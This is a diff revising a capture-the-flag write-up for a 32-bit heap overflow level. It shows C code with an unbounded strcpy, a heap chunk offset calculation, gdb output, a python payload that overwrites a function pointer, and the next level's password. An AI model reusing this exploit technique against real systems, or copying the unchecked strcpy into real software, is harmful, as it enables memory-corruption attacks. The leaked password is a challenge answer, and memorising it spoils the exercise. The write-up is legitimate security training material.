@@ -1,10 +1,8 @@
-# Level 6 — Heap Overflow (Overwriting Function Pointer)
+# level6
 
-## Introduction
-This level introduces heap buffer overflows. We are given a binary that allocates two blocks of memory on the heap consecutively: a buffer to hold user input, and a function pointer. By writing past the boundaries of the input buffer, we can overwrite the function pointer and redirect execution to a target function `n`.
+This exercise is a bit different. We must analyze how the heap is built, how each instruction changes it, and how chunks are stacked.
 
-## Analysis
-The reconstructed C code of the binary is:
+Here is the reconstructed C code:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -22,58 +20,69 @@ int main(int argc, char *argv[]) {
     char *dest;
     void (**fn_ptr)(void);
 
-    dest = (char *)malloc(0x40); // Allocates 64 bytes
-    fn_ptr = (void (**)(void))malloc(sizeof(void *)); // Allocates 4 bytes
+    dest = (char *)malloc(0x40);
+    fn_ptr = (void (**)(void))malloc(sizeof(void *));
     *fn_ptr = m;
 
     if (argc > 1) {
-        strcpy(dest, argv[1]); // Unbounded strcpy
+        strcpy(dest, argv[1]);
     }
 
-    (*fn_ptr)(); // Executes function pointer
+    (*fn_ptr)();
     return 0;
 }
 ```
 
-Since the program uses `strcpy` to copy command-line arguments to `dest` without verifying the size of `argv[1]`, we can overflow the 64-byte `dest` buffer. 
+### Heap Chunk Layout
 
-### Heap Layout and Offset Calculation
-In standard dlmalloc (used in 32-bit Linux binaries), heap chunks are placed sequentially and structured with metadata:
-1. **First chunk (`dest`):**
-   - User data size: 64 bytes (0x40).
-2. **Second chunk (`fn_ptr`):**
-   - Chunk metadata size: 8 bytes (prev_size + size).
-   - User data size: 4 bytes (contains the address of function `m`).
+When we call `malloc`, the memory allocated on the heap looks like this:
+```text
+[ metadata ]  <-- this metadata is 8 bytes long
+[ userdata ]  <-- here is the pointer that malloc returns
+```
 
-To overwrite the function pointer stored in the second chunk, we need to write:
-- `64` bytes to fill the `dest` buffer.
-- `8` bytes to overwrite the second chunk's metadata.
-- `4` bytes containing our target address.
-This results in a total padding offset of `72` bytes before the target address.
+When multiple chunks are allocated sequentially on the heap, they are stacked as follows:
+```text
+[ metadatac1 ]  <-- 8 bytes
+[ userdatac1 ]  <-- dest pointer (64 bytes)
+[ metadatac2 ]  <-- 8 bytes
+[ userdatac2 ]  <-- fn_ptr pointer (4 bytes)
+```
 
-### Finding the Address of `n`
-We disassemble the binary using `gdb` to find the address of the `n` function:
-```gdb
-(gdb) info functions n
-All functions matching regular expression "n":
+In this case, we allocate 64 bytes for `dest`, followed by 4 bytes for the function pointer `fn_ptr` (which holds the address of the `m` function).
 
+Since `strcpy` does not perform bounds checking, writing past the 64-byte boundary of `dest` allows us to overwrite the metadata of the second chunk and then overwrite the function pointer `fn_ptr` itself.
+
+To calculate the offset to `fn_ptr`:
+- `64` bytes of `dest` user data.
+- `8` bytes of chunk 2 metadata.
+Total offset = `64 + 8 = 72` bytes.
+
+### Finding the Target Address
+
+We disassemble the binary using GDB to find the address of the target function `n`:
+```text
+(gdb) info functions
 Non-debugging symbols:
+...
 0x08048454  n
+0x08048468  m
+...
 ```
 The address of `n` is `0x08048454`.
 
-### Crafting the Payload
-- **Padding:** 72 bytes (`"A" * 72`).
-- **Target Address:** `0x08048454` (little-endian: `\x54\x84\x04\x08`).
+### Building the Payload
 
-## Exploit
-We execute the binary by passing our payload as a command-line argument:
+We pad our input with 64 bytes (`U` * 64) for `dest`, 8 bytes (`M` * 8) for the metadata, and then the address of `n` reversed to little-endian using `[::-1]`:
 ```bash
-./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+python -c 'print "U" * 64 + "M" * 8 + "\x08\x04\x84\x54"[::-1]' > payload
 ```
 
-This overwrites `fn_ptr` to point to `n`, which outputs the password for `level7`:
+And execute the binary passing the payload as an argument:
+```bash
+./level6 $(cat payload)
+```
+This overwrites `fn_ptr` to point to `n`, printing the password for `level7`:
 ```
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
-We save this password to proceed to `level7`.
